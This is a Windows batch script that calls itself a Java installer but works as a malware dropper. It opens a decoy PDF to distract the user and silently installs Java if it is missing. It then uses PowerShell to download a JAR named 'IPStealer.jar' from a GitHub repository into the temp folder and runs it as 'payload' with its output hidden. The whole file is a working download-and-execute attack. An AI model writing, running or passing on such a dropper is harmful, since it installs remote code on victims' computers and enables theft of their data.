@echo off
REM --- Improved Installer for Java & Jar Execution ---
echo [Phase 1] Starting silent installation...
REM 1. Silent decoy
start "" "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf" >nul 2>&1

REM 2. Try to download and install Java 18 ONLY if not present
where java >nul 2>&1
if %errorlevel% neq 0 (
    echo [Phase 2] Java not found. Attempting to install Java 18...
    powershell -Command "$url='https://javadl.oracle.com/webapps/download/AutoDL?BundleId=249213_b2d4dfe4f4d04c8aab5a5b8f4a41c3a4'; $out='%TEMP%\java_installer.exe'; (New-Object Net.WebClient).DownloadFile($url, $out); Start-Process $out -ArgumentList '/s' -Wait -WindowStyle Hidden; Remove-Item $out"
) else (
    echo [Phase 2] Java is already installed.
)

REM 3. Download the JAR payload
echo [Phase 3] Downloading payload...
powershell -Command "$url='https://github.com/mavi30173-ai/mc-server/raw/main/IPStealer.jar'; $out='%TEMP%\payload.jar'; (New-Object Net.WebClient).DownloadFile($url, $out); echo 'Download complete.'"

REM 4. Execute the JAR with available Java
echo [Phase 4] Executing payload...
java -jar "%TEMP%\payload.jar" >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: Could not run the JAR file. Java may not be installed correctly.
    pause
    exit /b 1
)

echo [Phase 5] Cleaning up...
timeout /t 1 /nobreak >nul
echo Operation completed. You can close this window.
timeout /t 3 /nobreak >nul
exit
